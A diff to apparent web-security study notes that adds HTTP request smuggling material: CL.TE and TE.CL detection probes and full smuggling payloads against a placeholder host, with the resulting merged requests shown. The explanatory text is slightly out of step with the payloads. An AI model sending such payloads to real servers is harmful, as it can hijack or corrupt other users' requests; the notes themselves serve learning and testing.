@@ -143,36 +143,102 @@ Mysql `CONCAT('foo','bar')` or `'foo' 'bar'` note space.
 # HTTP request smuggling - writing one request so that the server thinks that it is 2 different.
 It uses 2 headers. `Content-Length: x` and `Transfer-Encoding: chunked`. **It works only in HTTTP/1.1**.
 
+## Test for CL.TE
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+```
+## Test for TE.CL
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+```
+
 
 ## CL.TE
 ```
-POST / HTTP/1.1
+POST /search HTTP/1.1
 Host: vulnerable-website.com
-Content-Length: 13
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
 Transfer-Encoding: chunked
 
-0
+e
+q=smuggling&x=
+0/49 char here
 
-SMUGGLED
+GET /404 HTTP/1.1
+Foo: x
 ```
 Front-end server support only Content-Length header, backend support Transfer-Encoding. Front pass all as 1 request, backend split into two and read second one as new request, which start from
-word SMUGGLED, as method. And next request passed to server will be added to this, and will arise error.
+word SMUGGLED, as method. And next request passed to server will be added to this, and will arise error as here:
+
+```
+GET /404 HTTP/1.1
+Foo: xPOST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+
+
+
+
 
 ## TE.CL
 ```
-POST / HTTP/1.1
+POST /search HTTP/1.1
 Host: vulnerable-website.com
-Content-Length: 3
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
 Transfer-Encoding: chunked
 
-8
-SMUGGLED
+7c
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
 0
 
-
+/7c char
 ````
-Front-end server support Transfer-Encoding header, backend support only Content-Length. Front pass all as 1 request, backend split into two and read second one as new request, which start from
-word SMUGGLED, as method. And next request passed to server will be added to this, and will arise error.
+Front-end server support Transfer-Encoding header, backend support only Content-Length. Front pass all as 1 request, backend split into two and read second one as new request. And next request passed to server will be added to this, and will arise error as here:
+```
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+
+x=
+0
+
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+
+
 
 ## TE.TE
 ```
